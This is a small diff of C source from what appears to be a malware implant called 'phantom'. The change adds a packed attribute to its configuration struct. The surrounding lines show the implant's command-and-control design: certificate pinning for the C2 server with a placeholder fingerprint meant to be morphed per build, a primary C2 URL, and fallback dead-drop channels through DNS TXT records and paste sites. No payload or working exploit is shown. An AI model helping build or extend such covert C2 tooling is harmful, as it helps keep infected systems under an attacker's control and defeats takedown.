@@ -46,7 +46,7 @@ static const uint32_t CB_LEN = sizeof(CB);
 /* Certificate fingerprint for C2 pinning (SHA-256 of DER-encoded cert) */
 static const uint8_t C2_CERT_FP[32] = { /*MORPH_CERT_FP*/ };
 
-struct phantom_cfg {
+struct __attribute__((packed)) phantom_cfg {
     char     c2_url[256];
     char     c2_fallback_dns[128];    /* DNS TXT domain for dead drop   */
     char     c2_fallback_paste[256];  /* Paste URL for dead drop        */
